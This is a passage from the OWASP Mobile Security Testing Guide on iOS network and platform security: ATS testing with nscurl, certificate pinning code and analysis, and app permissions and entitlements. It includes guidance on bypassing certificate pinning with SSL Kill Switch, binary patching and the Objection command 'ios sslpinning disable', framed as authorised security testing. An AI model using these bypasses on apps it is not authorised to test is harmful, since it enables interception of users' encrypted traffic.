Use '--verbose' to view the ATS dictionaries used and to display the error received in URLSession:task:didCompleteWithError:.
================================================================================

Default ATS Secure Connection
---
ATS Default Connection
Result : PASS
---

================================================================================

Allowing Arbitrary Loads

---
Allow All Loads
Result : PASS
---

================================================================================

Configuring TLS exceptions for www.example.com

---
TLSv1.3
2019-01-15 09:39:27.892 nscurl[11459:5126999] NSURLSession/NSURLConnection HTTP load failed (kCFStreamErrorDomainSSL, -9800)
Result : FAIL
---
\end{verbatim}

The output above only shows the first few results of nscurl. A
permutation of different settings is executed and verified against the
specified endpoint. If the default ATS secure connection test is
passing, ATS can be used in it's default secure configuration.

\begin{quote}
If there are any fails in the nscurl output, please change the server
side configuration of TLS to make the serverside more secure, instead of
weakening the configuration in ATS on the client.
\end{quote}

For more information on this topic please consult the
\href{https://www.nowsecure.com/blog/2017/08/31/security-analysts-guide-nsapptransportsecurity-nsallowsarbitraryloads-app-transport-security-ats-exceptions/}{blog
post by NowSecure on ATS}.

In general it can be summarized:

\begin{itemize}
\tightlist
\item
  ATS should be configured according to best practices by Apple and only
  be deactivated under certain circumstances.
\item
  If the application connects to a defined number of domains that the
  application owner controls, then configure the servers to support the
  ATS requirements and opt-in for the ATS requirements within the app.
  In the following example, \texttt{example.com} is owned by the
  application owner and ATS is enabled for that domain.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{NSAppTransportSecurity}\KeywordTok{</key>}
\KeywordTok{<dict>}
    \KeywordTok{<key>}\NormalTok{NSAllowsArbitraryLoads}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{NSExceptionDomains}\KeywordTok{</key>}
    \KeywordTok{<dict>}
        \KeywordTok{<key>}\NormalTok{example.com}\KeywordTok{</key>}
        \KeywordTok{<dict>}
            \KeywordTok{<key>}\NormalTok{NSIncludesSubdomains}\KeywordTok{</key>}
            \KeywordTok{<true/>}
            \KeywordTok{<key>}\NormalTok{NSExceptionMinimumTLSVersion}\KeywordTok{</key>}
            \KeywordTok{<string>}\NormalTok{TLSv1.2}\KeywordTok{</string>}
            \KeywordTok{<key>}\NormalTok{NSExceptionAllowsInsecureHTTPLoads}\KeywordTok{</key>}
            \KeywordTok{<false/>}
            \KeywordTok{<key>}\NormalTok{NSExceptionRequiresForwardSecrecy}\KeywordTok{</key>}
            \KeywordTok{<true/>}
        \KeywordTok{</dict>}
    \KeywordTok{</dict>}
\KeywordTok{</dict>}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  If connections to 3rd party domains are made (that are not under
  control of the app owner) it should be evaluated what ATS settings are
  not supported by the 3rd party domain and if they can be deactivated.
\item
  If the application opens third party web sites in web views, then from
  iOS 10 onwards \texttt{NSAllowsArbitraryLoadsInWebContent} can be used
  to disable ATS restrictions for the content loaded in web views
\end{itemize}

\hypertarget{testing-custom-certificate-stores-and-certificate-pinning-mstg-network-3-and-mstg-network-4}{%
\subsubsection{Testing Custom Certificate Stores and Certificate Pinning
(MSTG-NETWORK-3 and
MSTG-NETWORK-4)}\label{testing-custom-certificate-stores-and-certificate-pinning-mstg-network-3-and-mstg-network-4}}

\hypertarget{overview-58}{%
\paragraph{Overview}\label{overview-58}}

Certificate Authorities are an integral part of a secure client server
communication and they are predefined in the trust store of each
operating system. On iOS you are automatically trusting an enormous
amount of certificates which you can look up in detail in the Apple
documentation, that will show you
\href{https://support.apple.com/en-gb/HT204132}{lists of available
trusted root certificates for each iOS version}.

CAs can be added to the trust store, either manually through the user,
by an MDM that manages your enterprise device or through malware. The
question is then can I trust all of those CAs and should my app rely on
the trust store?

In order to address this risk you can use certificate pinning.
Certificate pinning is the process of associating the mobile app with a
particular X.509 certificate of a server, instead of accepting any
certificate signed by a trusted certificate authority. A mobile app that
stores the server certificate or public key will subsequently only
establish connections to the known server, thereby ``pinning'' the
server. By removing trust in external certificate authorities (CAs), the
attack surface is reduced. After all, there are many known cases where
certificate authorities have been compromised or tricked into issuing
certificates to impostors. A detailed timeline of CA breaches and
failures can be found at
\href{https://sslmate.com/certspotter/failures}{sslmate.com}.

The certificate can be pinned during development, or at the time the app
first connects to the backend. In that case, the certificate associated
or `pinned' to the host at when it seen for the first time. This second
variant is slightly less secure, as an attacker intercepting the initial
connection could inject their own certificate.

\hypertarget{when-the-pin-fails-1}{%
\subparagraph{When the Pin Fails}\label{when-the-pin-fails-1}}

Pinning failures can occur for various reasons: either the app is
expecting another key or certificate than offered by the server and/or
load balancer, or there might be a man-in-the-middle attack going on. In
both cases and similar as with Android, there are various ways to
respond to such a situation. Please see the section
``\href{0x05g-Testing-Network-Communication.md\#when-the-pin-fails}{When
the Pin Fails}'' in the chapter ``Android Network APIs''.

\hypertarget{static-analysis-65}{%
\paragraph{Static Analysis}\label{static-analysis-65}}

Verify that the server certificate is pinned. Pinning can be implemented
on various levels in terms of the certificate tree presented by the
server:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Including server's certificate in the application bundle and
  performing verification on each connection. This requires an update
  mechanisms whenever the certificate on the server is updated.
\item
  Limiting certificate issuer to e.g.~one entity and bundling the
  intermediate CA's public key into the application. In this way we
  limit the attack surface and have a valid certificate.
\item
  Owning and managing your own PKI. The application would contain the
  intermediate CA's public key. This avoids updating the application
  every time you change the certificate on the server, due to
  e.g.~expiration. Note that using your own CA would cause the
  certificate to be self-singed.
\end{enumerate}

The code presented below shows how it is possible to check if the
certificate provided by the server matches the certificate stored in the
app. The method below implements the connection authentication and tells
the delegate that the connection will send a request for an
authentication challenge.

The delegate must implement
\texttt{connection:canAuthenticateAgainstProtectionSpace:} and
\texttt{connection:\ forAuthenticationChallenge}. Within
\texttt{connection:\ forAuthenticationChallenge}, the delegate must call
\texttt{SecTrustEvaluate} to perform customary X.509 checks. The snippet
below implements a check of the certificate.

\begin{verbatim}
(void)connection:(NSURLConnection *)connection willSendRequestForAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge
{
  SecTrustRef serverTrust = challenge.protectionSpace.serverTrust;
  SecCertificateRef certificate = SecTrustGetCertificateAtIndex(serverTrust, 0);
  NSData *remoteCertificateData = CFBridgingRelease(SecCertificateCopyData(certificate));
  NSString *cerPath = [[NSBundle mainBundle] pathForResource:@"MyLocalCertificate" ofType:@"cer"];
  NSData *localCertData = [NSData dataWithContentsOfFile:cerPath];
  The control below can verify if the certificate received by the server is matching the one pinned in the client.
  if ([remoteCertificateData isEqualToData:localCertData]) {
  NSURLCredential *credential = [NSURLCredential credentialForTrust:serverTrust];
  [[challenge sender] useCredential:credential forAuthenticationChallenge:challenge];
}
else {
  [[challenge sender] cancelAuthenticationChallenge:challenge];
}
\end{verbatim}

Note that the certificate pinning example above has a major drawback
when you use certificate pinning and the certificate changes, then the
pin is invalidated. If you can reuse the public key of the server, then
you can create a new certificate with that same public key, which will
ease the maintenance. There are various ways in which you can do this:

\begin{itemize}
\tightlist
\item
  Implement your own pin based on the public key: Change the comparison
  \texttt{if\ ({[}remoteCertificateData\ isEqualToData:localCertData{]})\ \{}
  in our example to a comparison of the key-bytes or the
  certificate-thumb.
\item
  Use \href{https://github.com/datatheorem/TrustKit}{TrustKit}: here you
  can pin by setting the public key hashes in your Info.plist or provide
  the hashes in a dictionary. See their readme for more details.
\item
  Use \href{https://github.com/Alamofire/Alamofire}{AlamoFire}: here you
  can define a \texttt{ServerTrustPolicy} per domain for which you can
  define the pinning method.
\item
  Use \href{https://github.com/AFNetworking/AFNetworking}{AFNetworking}:
  here you can set an \texttt{AFSecurityPolicy} to configure your
  pinning.
\end{itemize}

\hypertarget{dynamic-analysis-61}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-61}}

\hypertarget{server-certificate-validation}{%
\subparagraph{Server certificate
validation}\label{server-certificate-validation}}

Our test approach is to gradually relax security of the SSL handshake
negotiation and check which security mechanisms are enabled.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Having Burp set up as a proxy, make sure that there is no certificate
  added to the trust store (\textbf{Settings} -\textgreater{}
  \textbf{General} -\textgreater{} \textbf{Profiles}) and that tools
  like SSL Kill Switch are deactivated. Launch your application and
  check if you can see the traffic in Burp. Any failures will be
  reported under `Alerts' tab. If you can see the traffic, it means that
  there is no certificate validation performed at all. If however, you
  can't see any traffic and you have an information about SSL handshake
  failure, follow the next point.
\item
  Now, install the Burp certificate, as explained in
  \href{https://support.portswigger.net/customer/portal/articles/1841109-installing-burp-s-ca-certificate-in-an-ios-device}{Burp's
  user documentation}. If the handshake is successful and you can see
  the traffic in Burp, it means that the certificate is validated
  against the device's trust store, but no pinning is performed.
\item
  If executing the instructions from the previous step doesn't lead to
  traffic being proxied through burp, it may mean that the certificate
  is actually pinned and all security measures are in place. However,
  you still need to bypass the pinning in order to test the application.
  Please refer to the section
  ``\protect\hyperlink{bypassing-certificate-pinning}{Bypassing
  Certificate Pinning}'' below for more information on this.
\end{enumerate}

\hypertarget{client-certificate-validation}{%
\subparagraph{Client certificate
validation}\label{client-certificate-validation}}

Some applications use two-way SSL handshake, meaning that application
verifies server's certificate and server verifies client's certificate.
You can notice this if there is an error in Burp `Alerts' tab indicating
that client failed to negotiate connection.

There is a couple of things worth noting:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The client certificate contains a private key that will be used for
  the key exchange.
\item
  Usually the certificate would also need a password to use (decrypt)
  it.
\item
  The certificate can be stored in the binary itself, data directory or
  in the Keychain.
\end{enumerate}

The most common and improper way of doing two-way handshake is to store
the client certificate within the application bundle and hardcode the
password. This obviously does not bring much security, because all
clients will share the same certificate.

Second way of storing the certificate (and possibly password) is to use
the Keychain. Upon first login, the application should download the
personal certificate and store it securely in the Keychain.

Sometimes applications have one certificate that is hardcoded and use it
for the first login and then the personal certificate is downloaded. In
this case, check if it's possible to still use the `generic' certificate
to connect to the server.

Once you have extracted the certificate from the application (e.g.~using
Cycript or Frida), add it as client certificate in Burp, and you will be
able to intercept the traffic.

\hypertarget{bypassing-certificate-pinning-1}{%
\subparagraph{Bypassing Certificate
Pinning}\label{bypassing-certificate-pinning-1}}

There are various ways to bypass SSL Pinning and the following section
will describe it for jailbroken and non-jailbroken devices.

If you have a jailbroken device you can try one of the following tools
that can automatically disable SSL Pinning:

\begin{itemize}
\tightlist
\item
  ``\href{https://github.com/nabla-c0d3/ssl-kill-switch2}{SSL Kill
  Switch 2}'' is one way to disable certificate pinning. It can be
  installed via the Cydia store. It will hook on to all high-level API
  calls and bypass certificate pinning.
\item
  The Burp Suite app
  ``\href{https://portswigger.net/burp/help/mobile_testing_using_mobile_assistant.html}{Mobile
  Assistant}'' can also be used to bypass certificate pinning.
\end{itemize}

In some cases, certificate pinning is tricky to bypass. Look for the
following when you can access the source code and recompile the app:

\begin{itemize}
\tightlist
\item
  the API calls \texttt{NSURLSession}, \texttt{CFStream}, and
  \texttt{AFNetworking}
\item
  methods/strings containing words like ``pinning'', ``X.509'',
  ``Certificate'', etc.
\end{itemize}

If you don't have access to the source, you can try binary patching:

\begin{itemize}
\tightlist
\item
  If OpenSSL certificate pinning is used, you can try
  \href{https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/}{binary
  patching}.
\item
  Sometimes, the certificate is a file in the application bundle.
  Replacing the certificate with Burp's certificate may be sufficient,
  but beware of the certificate's SHA sum. If it's hardcoded into the
  binary, you must replace it too!
\end{itemize}

It is also possible to bypass SSL Pinning on non-jailbroken devices by
using Frida and Objection (this also works on jailbroken devices). After
repackaging your application with Objection as described in ``iOS Basic
Security Testing'', you can use the following command in Objection to
disable common SSL Pinning implementations:

\begin{verbatim}
$ ios sslpinning disable
\end{verbatim}

You can look into the
\href{https://github.com/sensepost/objection/blob/master/agent/src/ios/pinning.ts}{pinning.ts}
file to understand how the bypass works.

See also
\href{https://github.com/sensepost/objection\#ssl-pinning-bypass-running-for-an-ios-application}{Objection's
documentation on Disabling SSL Pinning for iOS} for further information.

If you want to get more details about white box testing and typical code
patterns, refer to {[}\#thiel{]}. It contains descriptions and code
snippets illustrating the most common certificate pinning techniques.

\hypertarget{references-21}{%
\paragraph{References}\label{references-21}}

\begin{itemize}
\tightlist
\item
  {[}\#thiel{]} - David Thiel. iOS Application Security, No Starch
  Press, 2015
\end{itemize}

\hypertarget{owasp-masvs-16}{%
\subparagraph{OWASP MASVS}\label{owasp-masvs-16}}

\begin{itemize}
\tightlist
\item
  MSTG-NETWORK-2: ``The TLS settings are in line with current best
  practices, or as close as possible if the mobile operating system does
  not support the recommended standards.''
\item
  MSTG-NETWORK-3: ``The app verifies the X.509 certificate of the remote
  endpoint when the secure channel is established. Only certificates
  signed by a trusted CA are accepted.''
\item
  MSTG-NETWORK-4: ``The app either uses its own certificate store, or
  pins the endpoint certificate or public key, and subsequently does not
  establish connections with endpoints that offer a different
  certificate or key, even if signed by a trusted CA.''
\end{itemize}

\hypertarget{nscurl}{%
\subparagraph{Nscurl}\label{nscurl}}

\begin{itemize}
\tightlist
\item
  A guide to ATS - Blog post by NowSecure -
  \url{https://www.nowsecure.com/blog/2017/08/31/security-analysts-guide-nsapptransportsecurity-nsallowsarbitraryloads-app-transport-security-ats-exceptions/}
\end{itemize}

\hypertarget{ios-platform-apis}{%
\subsection{iOS Platform APIs}\label{ios-platform-apis}}

\hypertarget{testing-app-permissions-mstg-platform-1-1}{%
\subsubsection{Testing App Permissions
(MSTG-PLATFORM-1)}\label{testing-app-permissions-mstg-platform-1-1}}

\hypertarget{overview-59}{%
\paragraph{Overview}\label{overview-59}}

In contrast to Android, where each app runs on its own user ID, iOS
makes all third-party apps run under the non-privileged \texttt{mobile}
user. Each app has a unique home directory and is sandboxed, so that
they cannot access protected system resources or files stored by the
system or by other apps. These restrictions are implemented via sandbox
policies (aka. \emph{profiles}), which are enforced by the
\href{http://www.trustedbsd.org/mac.html}{Trusted BSD (MAC) Mandatory
Access Control Framework} via a kernel extension. iOS applies a generic
sandbox profile to all third-party apps called \emph{container}. Access
to protected resources or data (some also known as
\href{https://developer.apple.com/support/app-capabilities/}{app
capabilities}) is possible, but it's strictly controlled via special
permissions known as \emph{entitlements}.

Some permissions can be configured by the app's developers (e.g.~Data
Protection or Keychain Sharing) and will directly take effect after the
installation. However, for others, the user will be explicitly asked the
first time the app attempts to access a protected resource,
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ExpectedAppBehaviors/ExpectedAppBehaviors.html\#//apple_ref/doc/uid/TP40007072-CH3-SW7}{for
example}:

\begin{itemize}
\tightlist
\item
  Bluetooth peripherals
\item
  Calendar data
\item
  Camera
\item
  Contacts
\item
  Health sharing
\item
  Health updating
\item
  HomeKit
\item
  Location
\item
  Microphone
\item
  Motion
\item
  Music and the media library
\item
  Photos
\item
  Reminders
\item
  Siri
\item
  Speech recognition
\item
  the TV provider
\end{itemize}

Even though Apple urges to protect the privacy of the user and to be
\href{https://developer.apple.com/design/human-interface-guidelines/ios/app-architecture/requesting-permission/}{very
clear on how to ask permissions}, it can still be the case that an app
requests too many of them for non-obvious reasons.

Some permissions like camera, photos, calendar data, motion, contacts or
speech recognition should be pretty straightforward to verify as it
should be obvious if the app requires them to fulfill its tasks. For
example, a QR Code scanning app
\href{https://developer.apple.com/documentation/avfoundation/cameras_and_media_capture/requesting_authorization_for_media_capture_on_ios}{requires
the camera} to function but might be
\href{https://developer.apple.com/documentation/photokit/requesting_authorization_to_access_photos}{requesting
the photos permission} as well which, if granted, gives the app access
to all user photos in the ``Camera Roll'' (the iOS default system-wide
location for storing photos). A malicious app could use this to leak the
user pictures. For this reason, apps using the camera permission might
rather want to avoid requesting the photos permission and store the
taken pictures inside the app sandbox to avoid other apps (having the
photos permission) to access them. Additional steps might be required if
the pictures are considered sensitive, e.g.~corporate data, passwords or
credit cards. See the chapter
``\href{0x06d-Testing-Data-Storage.md}{Data Storage on iOS}'' for more
information.

Other permissions like Bluetooth or Location require deeper verification
steps. They may be required for the app to properly function but the
data being handled by those tasks might not be properly protected. For
more information and some examples please refer to the
``\protect\hyperlink{source-code-inspection}{Source Code Inspection}''
in the ``Static Analysis'' section below and to the ``Dynamic Analysis''
section.

When collecting or simply handling (e.g.~caching) sensitive data, an app
should provide proper mechanisms to give the user control over it,
e.g.~to be able to revoke access or to delete it. However, sensitive
data might not only be stored or cached but also sent over the network.
In both cases, it has to be ensured that the app properly follows the
appropriate best practices, which in this case involve implementing
proper data protection and transport security. More information on how
to protect this kind of data can be found in the chapter ``Network
APIs''.

As you can see, using app capabilities and permissions mostly involve
handling personal data, therefore being a matter of protecting the
user's privacy. See the articles
\href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy}{``Protecting
the User's Privacy''} and
\href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc}{``Accessing
Protected Resources''} in Apple Developer Documentation for more
details.

\hypertarget{device-capabilities}{%
\subparagraph{Device Capabilities}\label{device-capabilities}}

Device capabilities are used by the App Store to ensure that only
compatible devices are listed and therefore are allowed to download the
app. They are specified in the \texttt{Info.plist} file of the app under
the
\href{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html\#//apple_ref/doc/plist/info/UIRequiredDeviceCapabilities}{\texttt{UIRequiredDeviceCapabilities}}
key.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{UIRequiredDeviceCapabilities}\KeywordTok{</key>}
\KeywordTok{<array>}
    \KeywordTok{<string>}\NormalTok{armv7}\KeywordTok{</string>}
\KeywordTok{</array>}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Typically you'll find the \texttt{armv7} capability, meaning that the
app is compiled only for the armv7 instruction set, or if it's a
32/64-bit universal app.
\end{quote}

For example, an app might be completely dependent on NFC to work (e.g.~a
\href{https://itunes.apple.com/us/app/nfc-taginfo-by-nxp/id1246143596}{``NFC
Tag Reader''} app). According to the
\href{https://developer.apple.com/library/archive/documentation/DeviceInformation/Reference/iOSDeviceCompatibility/DeviceCompatibilityMatrix/DeviceCompatibilityMatrix.html}{archived
iOS Device Compatibility Reference}, NFC is only available starting on
the iPhone 7 (and iOS 11). A developer might want to exclude all
incompatible devices by setting the \texttt{nfc} device capability.

Regarding testing, you can consider
\texttt{UIRequiredDeviceCapabilities} as a mere indication that the app
is using some specific resources. Unlike the entitlements related to app
capabilities, device capabilities do not confer any right or access to
protected resources. Additional configuration steps might be required
for that, which are very specific to each capability.

For example, if BLE is a core feature of the app, Apple's
\href{https://developer.apple.com/library/archive/documentation/NetworkingInternetWeb/Conceptual/CoreBluetooth_concepts/CoreBluetoothOverview/CoreBluetoothOverview.html\#//apple_ref/doc/uid/TP40013257-CH2-SW1}{Core
Bluetooth Programming Guide} explains the different things to be
considered:

\begin{itemize}
\tightlist
\item
  The \texttt{bluetooth-le} device capability can be set in order to
  \emph{restrict} non-BLE capable devices from downloading their app.
\item
  App capabilities like \texttt{bluetooth-peripheral} or
  \texttt{bluetooth-central} (both \texttt{UIBackgroundModes}) should be
  added if
  \href{https://developer.apple.com/library/archive/documentation/NetworkingInternetWeb/Conceptual/CoreBluetooth_concepts/CoreBluetoothBackgroundProcessingForIOSApps/PerformingTasksWhileYourAppIsInTheBackground.html}{BLE
  background processing} is required.
\end{itemize}

However, this is not yet enough for the app to get access to the
Bluetooth peripheral, the \texttt{NSBluetoothPeripheralUsageDescription}
key has to be included in the \texttt{Info.plist} file, meaning that the
user has to actively give permission. See ``Purpose Strings in the
Info.plist File'' below for more information.

\hypertarget{entitlements}{%
\subparagraph{Entitlements}\label{entitlements}}

According to
\href{https://www.apple.com/business/site/docs/iOS_Security_Guide.pdf}{Apple's
iOS Security Guide}:

\begin{quote}
Entitlements are key value pairs that are signed in to an app and allow
authentication beyond runtime factors, like UNIX user ID. Since
entitlements are digitally signed, they can't be changed. Entitlements
are used extensively by system apps and daemons to perform specific
privileged operations that would otherwise require the process to run as
root. This greatly reduces the potential for privilege escalation by a
compromised system app or daemon.
\end{quote}

Many entitlements can be set using the ``Summary'' tab of the Xcode
target editor. Other entitlements require editing a target's
entitlements property list file or are inherited from the iOS
provisioning profile used to run the app.

\href{https://developer.apple.com/library/archive/technotes/tn2415/_index.html\#//apple_ref/doc/uid/DTS40016427-CH1-SOURCES}{Entitlement
Sources}:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Entitlements embedded in a provisioning profile that is used to code
  sign the app, which are composed of:

  \begin{itemize}
  \tightlist
  \item
    Capabilities defined on the Xcode project's target Capabilities tab,
    and/or:
  \item
    Enabled Services on the app's App ID which are configured on the
    Identifiers section of the Certificates, ID's and Profiles website.
  \item
    Other entitlements that are injected by the profile generation
    service.
  \end{itemize}
\item
  Entitlements from a code signing entitlements file.
\end{enumerate}

\href{https://developer.apple.com/library/archive/technotes/tn2415/_index.html\#//apple_ref/doc/uid/DTS40016427-CH1-DESTINATIONS}{Entitlement
Destinations}:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The app's signature.
\item
  The app's embedded provisioning profile.
\end{enumerate}

The
\href{https://developer.apple.com/library/archive/technotes/tn2415/_index.html\#//apple_ref/doc/uid/DTS40016427-CH1-APPENTITLEMENTS}{Apple
Developer Documentation} also explains:

\begin{itemize}
\tightlist
\item
  During code signing, the entitlements corresponding to the app's
  enabled Capabilities/Services are transferred to the app's signature
  from the provisioning profile Xcode chose to sign the app.
\item
  The provisioning profile is embedded into the app bundle during the
  build (\texttt{embedded.mobileprovision}).
\item
  Entitlements from the ``Code Signing Entitlements'' section in Xcode's
  ``Build Settings'' tab are transferred to the app's signature.
\end{itemize}

For example, if you want to set the ``Default Data Protection''
capability, you would need to go to the \textbf{Capabilities} tab in
Xcode and enable \textbf{Data Protection}. This is directly written by
Xcode to the \texttt{\textless{}appname\textgreater{}.entitlements} file
as the \texttt{com.apple.developer.default-data-protection} entitlement
with default value \texttt{NSFileProtectionComplete}. In the IPA we
might find this in the \texttt{embedded.mobileprovision} as:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{Entitlements}\KeywordTok{</key>}
\KeywordTok{<dict>}
\NormalTok{    ...}
    \KeywordTok{<key>}\NormalTok{com.apple.developer.default{-}data{-}protection}\KeywordTok{</key>}
    \KeywordTok{<string>}\NormalTok{NSFileProtectionComplete}\KeywordTok{</string>}
\KeywordTok{</dict>}
\end{Highlighting}
\end{Shaded}

For other capabilities such as HealthKit, the user has to be asked for
permission, therefore it is not enough to add the entitlements, special
keys and strings have to be added to the \texttt{Info.plist} file of the
app.

The following sections go more into detail about the mentioned files and
how to perform static and dynamic analysis using them.

\hypertarget{static-analysis-66}{%
\paragraph{Static Analysis}\label{static-analysis-66}}

Since iOS 10, these are the main areas which you need to inspect for
permissions:

\begin{itemize}
\tightlist
\item
  Purpose Strings in the Info.plist File
\item
  Code Signing Entitlements File
\item
  Embedded Provisioning Profile File
\item
  Entitlements Embedded in the Compiled App Binary
\item
  Source Code Inspection
\end{itemize}

\hypertarget{purpose-strings-in-the-info.plist-file}{%
\subparagraph{Purpose Strings in the Info.plist
File}\label{purpose-strings-in-the-info.plist-file}}

\href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc\#3037322}{\emph{Purpose
strings}} or \emph{usage description strings} are custom texts that are
offered to users in the system's permission request alert when
requesting permission to access protected data or resources.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/cc898defa915d8d7db3adb3f979afac334c445be.png}
\caption{Images/Chapters/0x06h/permission\_request\_alert.png}
\end{figure}

If linking on or after iOS 10, developers are required to include
purpose strings in their app's
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ExpectedAppBehaviors/ExpectedAppBehaviors.html\#//apple_ref/doc/uid/TP40007072-CH3-SW5}{\texttt{Info.plist}}
file. Otherwise, if the app attempts to access protected data or
resources without having provided the corresponding purpose string,
\href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc}{the
access will fail and the app might even crash}.

If having the original source code, you can verify the permissions
included in the \texttt{Info.plist} file:

\begin{itemize}
\tightlist
\item
  Open the project with Xcode.
\item
  Find and open the \texttt{Info.plist} file in the default editor and
  search for the keys starting with \texttt{"Privacy\ -"}.
\end{itemize}

You may switch the view to display the raw values by right-clicking and
selecting ``Show Raw Keys/Values'' (this way for example
\texttt{"Privacy\ -\ Location\ When\ In\ Use\ Usage\ Description"} will
turn into \texttt{NSLocationWhenInUseUsageDescription}).

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/eae05828cb9867b6aee454c942147439062e1a64.png}
\caption{Images/Chapters/0x06h/purpose\_strings\_xcode.png}
\end{figure}

If only having the IPA:

\begin{itemize}
\item
  Unzip the IPA.
\item
  The \texttt{Info.plist} is located in
  \texttt{Payload/\textless{}appname\textgreater{}.app/Info.plist}.
\item
  Convert it if needed
  (e.g.~\texttt{plutil\ -convert\ xml1\ Info.plist}) as explained in the
  chapter ``iOS Basic Security Testing'', section ``The Info.plist
  File''.
\item
  Inspect all \emph{purpose strings Info.plist keys}, usually ending
  with \texttt{UsageDescription}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<plist}\OtherTok{ version=}\StringTok{"1.0"}\KeywordTok{>}
\KeywordTok{<dict>}
    \KeywordTok{<key>}\NormalTok{NSLocationWhenInUseUsageDescription}\KeywordTok{</key>}
    \KeywordTok{<string>}\NormalTok{Your location is used to provide turn{-}by{-}turn directions to your destination.}\KeywordTok{</string>}
\end{Highlighting}
\end{Shaded}
\end{itemize}

For an overview of the different \emph{purpose strings Info.plist keys}
available see Table 1-2 at the
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ExpectedAppBehaviors/ExpectedAppBehaviors.html\#//apple_ref/doc/uid/TP40007072-CH3-SW7}{Apple
App Programming Guide for iOS}. Click on the provided links to see the
full description of each key in the
\href{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html}{CocoaKeys
reference}.

Following these guidelines should make it relatively simple to evaluate
each and every entry in the \texttt{Info.plist} file to check if the
permission makes sense.

For example, imagine the following lines were extracted from a
\texttt{Info.plist} file used by a Solitaire game:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{NSHealthClinicalHealthRecordsShareUsageDescription}\KeywordTok{</key>}
\KeywordTok{<string>}\NormalTok{Share your health data with us!}\KeywordTok{</string>}
\KeywordTok{<key>}\NormalTok{NSCameraUsageDescription}\KeywordTok{</key>}
\KeywordTok{<string>}\NormalTok{We want to access your camera}\KeywordTok{</string>}
\end{Highlighting}
\end{Shaded}

It should be suspicious that a regular solitaire game requests this kind
of resource access as it probably does not have any need for
\href{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html\#//apple_ref/doc/uid/TP40009251-SW24}{accessing
the camera} nor a
\href{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html\#//apple_ref/doc/uid/TP40009251-SW76}{user's
health-records}.

Apart from simply checking if the permissions make sense, further
analysis steps might be derived from analyzing purpose strings e.g.~if
they are related to storage sensitive data. For example,
\texttt{NSPhotoLibraryUsageDescription} can be considered as a storage
permission giving access to files that are outside of the app's sandbox
and might also be accessible by other apps. In this case, it should be
tested that no sensitive data is being stored there (photos in this
case). For other purpose strings like
\texttt{NSLocationAlwaysUsageDescription}, it must be also considered if
the app is storing this data securely. Refer to the ``Testing Data
Storage'' chapter for more information and best practices on securely
storing sensitive data.

\hypertarget{code-signing-entitlements-file}{%
\subparagraph{Code Signing Entitlements
File}\label{code-signing-entitlements-file}}

Certain capabilities require a
\href{https://developer.apple.com/library/archive/technotes/tn2415/_index.html\#//apple_ref/doc/uid/DTS40016427-CH1-ENTITLEMENTSFILE}{code
signing entitlements file}
(\texttt{\textless{}appname\textgreater{}.entitlements}). It is
automatically generated by Xcode but may be manually edited and/or
extended by the developer as well.

Here is an example of entitlements file of the
\href{https://github.com/peter-iakovlev/Telegram-iOS/blob/77ee5c4dabdd6eb5f1e2ff76219edf7e18b45c00/Telegram-iOS/Telegram-iOS-AppStoreLLC.entitlements\#L23}{open
source app Telegram} including the
\href{https://developer.apple.com/documentation/foundation/com_apple_security_application-groups}{App
Groups entitlement} (\texttt{application-groups}):

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="UTF{-}8"}\KeywordTok{?>}
\DataTypeTok{<!DOCTYPE }\NormalTok{plist PUBLIC "{-}//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList{-}1.0.dtd"}\DataTypeTok{>}
\KeywordTok{<plist}\OtherTok{ version=}\StringTok{"1.0"}\KeywordTok{>}
\KeywordTok{<dict>}
\NormalTok{...}
    \KeywordTok{<key>}\NormalTok{com.apple.security.application{-}groups}\KeywordTok{</key>}
    \KeywordTok{<array>}
        \KeywordTok{<string>}\NormalTok{group.ph.telegra.Telegraph}\KeywordTok{</string>}
    \KeywordTok{</array>}
\KeywordTok{</dict>}
\NormalTok{...}
\KeywordTok{</plist>}
\end{Highlighting}
\end{Shaded}

The entitlement outlined above does not require any additional
permissions from the user. However, it is always a good practice to
check all entitlements, as the app might overask the user in terms of
permissions and thereby leak information.

As documented at
